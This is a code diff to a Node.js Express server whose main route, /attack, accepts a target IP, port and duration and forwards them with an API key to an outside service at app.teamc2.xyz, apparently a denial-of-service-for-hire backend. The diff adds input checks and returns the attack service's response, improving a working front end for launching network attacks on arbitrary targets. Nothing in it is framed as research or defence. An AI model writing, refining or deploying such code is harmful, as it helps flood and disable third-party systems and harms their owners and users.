@@ -15,7 +15,6 @@ app.use(express.json());
 const API_KEY = process.env.API_KEY;
 const PORT = process.env.PORT;
 
-// 🔒 Hard fail if PORT missing (Railway requirement)
 if (!PORT) {
   console.error("FATAL: PORT not provided");
   process.exit(1);
@@ -33,26 +32,26 @@ process.on("unhandledRejection", (err) => {
   console.error("UNHANDLED PROMISE:", err);
 });
 
-// Health routes (Railway needs this)
-app.get("/", (req, res) => {
-  res.status(200).send("OK");
-});
-
-app.get("/health", (req, res) => {
-  res.status(200).send("OK");
-});
-
-app.get("/test", (req, res) => {
-  res.json({ msg: "Test OK" });
-});
+// Health routes
+app.get("/", (req, res) => res.status(200).send("OK"));
+app.get("/health", (req, res) => res.status(200).send("OK"));
+app.get("/test", (req, res) => res.json({ msg: "Test OK" }));
 
 // Main API
 app.post("/attack", async (req, res) => {
   try {
-    const { ip, port, time } = req.body;
+    let { ip, port, time } = req.body;
 
+    // 🔒 Basic validation
     if (!ip || !port || !time) {
       return res.status(400).json({ error: "Missing params" });
+    }
+
+    port = Number(port);
+    time = Number(time);
+
+    if (isNaN(port) || isNaN(time)) {
+      return res.status(400).json({ error: "Invalid port/time" });
     }
 
     if (!API_KEY) {
@@ -61,20 +60,20 @@ app.post("/attack", async (req, res) => {
 
     const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
-     const response = await axios.get(url, {
-      timeout: 15000, // prevent hanging
-    }); 
+    const response = await axios.get(url, {
+      timeout: 15000,
+    });
 
     return res.json({
       success: true,
-      msg: "backend  working",
+      data: response.data, // ✅ actual API response
     });
 
   } catch (err) {
     console.error("ERROR:", err?.response?.data || err.message);
 
     return res.status(500).json({
-      error: "Server error",
+      error: err?.response?.data || "Server error",
     });
   }
 });
@@ -84,7 +83,7 @@ const server = app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running on port ${PORT}`);
 });
 
-// Graceful shutdown (fixes SIGTERM issue)
+// Graceful shutdown
 process.on("SIGTERM", () => {
   console.log("SIGTERM received. Shutting down...");
   server.close(() => {
